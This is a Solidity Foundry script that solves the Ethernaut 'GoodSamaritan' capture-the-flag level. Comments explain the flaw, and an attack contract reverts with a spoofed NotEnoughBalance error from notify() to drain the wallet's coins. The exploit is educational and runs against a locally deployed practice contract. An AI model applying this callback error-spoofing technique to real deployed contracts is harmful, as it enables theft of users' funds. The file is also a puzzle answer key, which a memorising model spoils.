// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Script.sol";
import "forge-std/console.sol";
import {GoodSamaritan, Coin, Wallet, INotifyable} from "../src/GoodSamaritan.sol";

contract GoodSamaritanSolution is Script {
    // $ forge script script/GoodSamaritan.s.sol --tc GoodSamaritanSolution

    function run() external {
        address walletOwner = makeAddr("wallet");
        vm.deal(walletOwner, 1 ether);
        vm.startPrank(walletOwner);

        GoodSamaritan goodSamaritanInstance = new GoodSamaritan();
        Wallet wallet = Wallet(goodSamaritanInstance.wallet());
        Coin coin = Coin(goodSamaritanInstance.coin());

        console.log("wallet balance:", coin.balances(address(wallet)));
        console.log("-----------------");

        console.log("--> Attack Starts From here <--");

        // - The contract `GoodSamaritan` represents a rich man who donates to people by giving them 10 ERC20 coins from `Coin` contracts, when firing `GoodSamaritan::requestDonation()` function.
        // - The `Wallet` contract checks that if the balance it has is smaller than 10, they are giving the caller the remaining balance it has. else they are giving them only 10 in the `donate10` function.
        // - The contract knows if the transaction reverted or not by making an external call using try/catch and check the status.
        // - If it reverted, it returned a custom error `NotEnoughBalance()`.
        // - The problem lies in the `Coin` contract, the `transfer()` function fires the function `notify()` on the destination (receiver of the donations), if the caller is a contract.
        // - The attack can occur by reverting the calling of `notify` with the same error message `NotEnoughBalance()`, so when the `GoodSamaritan::requestDonation()` fired, it will revert with the `NotEnoughBalance()`, making the donation value equals the whole balance of the wallet.
        // - Since this attack should occur as one transaction, we need to revert the first call (the donation of 10), and not revert the second call of `notify` (the transferring of all wallet balance).
        // - We will depend on `balances` mapping in the `Coin` contract as the values are updated before firing `notify`.
        // - So after implementing the right logic, in the attack contract, we will be able to drain all balance from the `wallet Contract.

        address attacker = makeAddr("attacker");
        vm.deal(attacker, 1 ether);
        vm.startPrank(attacker);

        GoodSamaritanAttack attackContract = new GoodSamaritanAttack(address(goodSamaritanInstance), address(coin));

        attackContract.fireRequestDonation();

        console.log("wallet balance:", coin.balances(address(wallet)));
        console.log("Attacker Contract balance:", coin.balances(address(attackContract)));
    }
}

contract GoodSamaritanAttack is INotifyable {
    error NotEnoughBalance();

    GoodSamaritan public immutable goodSamaritan;
    Coin public immutable coin;

    constructor(address _goodSamaritan, address _coin) {
        goodSamaritan = GoodSamaritan(_goodSamaritan);
        coin = Coin(_coin);
    }

    function notify(uint256 /* amount */ ) public override {
        if (coin.balances(address(this)) == 10) {
            revert NotEnoughBalance();
        }
    }

    function fireRequestDonation() external {
        goodSamaritan.requestDonation();
    }
}
